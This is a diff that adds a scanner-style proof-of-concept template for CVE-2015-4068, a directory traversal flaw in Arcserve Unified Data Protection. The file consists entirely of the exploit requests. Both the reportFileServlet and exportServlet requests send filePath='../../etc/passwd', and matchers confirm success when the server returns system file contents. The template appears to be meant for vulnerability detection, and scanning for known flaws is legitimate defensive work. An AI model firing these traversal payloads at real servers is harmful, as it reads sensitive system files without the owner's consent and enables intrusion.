@@ -1,0 +1,58 @@
+[info]
+author = "ave"
+description = "检测 Arcserve Unified Data Protection (UDP) 中的目录遍历漏洞。该漏洞允许攻击者通过精心构造的文件路径访问报告文件或导出服务servlet，从而获取敏感信息或导致服务端损毁。"
+id = "POC-AVE-2015-0506"
+name = "CVE-2015-4068 目录遍历漏洞 PoC"
+severity = "critical"
+tags = [
+    "path-traversal",
+    "arcserve",
+    "udp",
+]
+vuln_id = [
+    "CVE-2015-4068",
+    "AVE-2015-0506",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/reportFileServlet"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+filePath = "../../etc/passwd"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/exportServlet"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+filePath = "../../etc/passwd"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["content="]
